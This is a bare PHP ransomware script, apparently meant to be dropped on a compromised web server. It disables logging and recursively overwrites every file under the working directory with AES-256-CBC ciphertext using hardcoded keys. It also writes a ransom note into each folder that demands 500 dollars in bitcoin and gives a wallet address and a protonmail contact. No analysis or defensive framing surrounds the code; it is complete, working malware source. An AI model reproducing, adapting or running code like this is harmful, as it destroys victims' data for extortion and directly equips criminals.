<?php
@set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);

function secured_encrypt($data)
{
$first_key = base64_decode("L/Rzmh1BdXaUQ3P9skYSdkxsny3LsPHo9UBFJoGjmRc=");
$second_key = base64_decode("gZ4RAl95BQxXluUUhkQtklnl3sODP25dnhz7QUmaJ0HUC9+ZFh0rkIWOstBXx55jBQeAJwss/SKqnpwmWjuyTg==");   
   
$method = "aes-256-cbc";   
$iv_length = openssl_cipher_iv_length($method);
$iv = openssl_random_pseudo_bytes($iv_length);
       
$first_encrypted = openssl_encrypt($data,$method,$first_key, OPENSSL_RAW_DATA ,$iv);   
$second_encrypted = hash_hmac('sha3-512', $first_encrypted, $second_key, TRUE);
           
$output = base64_encode($iv.$second_encrypted.$first_encrypted);   
return $output;       
}

function getDirContents($dir, &$results = array()) {
    $files = scandir($dir);

    foreach ($files as $key => $value) {
        $path = realpath($dir . DIRECTORY_SEPARATOR . $value);
        if (!is_dir($path)) {
                if(strpos($value,".htaccess") == true||   strpos($path,"ntwgsccrgx.php") == true || strpos($path,"ALL FILES ARE") == true) continue;

                else{
                    $fl = file_get_contents($path);
                    $ent = secured_encrypt($fl);
                    file_put_contents($path, $ent);
                }
            
            $results[] = $path;
        }
        else if ($value != "." && $value != "..") {
            $data = "Q: Whats Happen?
A: Your files have been encrypted. The file structure was not damaged, we did everything possible so that this could not happen.
</p>
<p>
.2.
Q: How to recover files?
A: If you wish to decrypt your files you will need to pay 500$ in bitcoin. btc address: 1PaYcvE2W6HrC4jcb6phACs3pg28NUBWeb
</p>
<p>
.3.
Q: What about guarantees?
A: Its just a business. We absolutely do not care about you and your deals, except getting benefits. If we do not do our work and liabilities - nobody will cooperate with us. Its not in our interests.
To check the ability of returning files, you can send to us any 2 files and low sizes(max 1 mb), we will decrypt them and send back to you. That is our guarantee.
</p>
<p>
.4.
Q: How to contact with you?
A: You can write us to our mailbox: tothefreedom@protonmail.com
</p>
<p>
.5.
Q: How will the decryption process proceed after payment?
A: After payment we will send to you our scanner-decoder program and detailed instructions for use. With this program you will be able to decrypt all your encrypted files.";
            file_put_contents($path."/"."ALL FILES ARE ENCRYPTED READ ME.TXT", $data);
            getDirContents($path, $results);
            $results[] = $path;
        }
    }

    return $results;
}

getDirContents(getcwd());


?>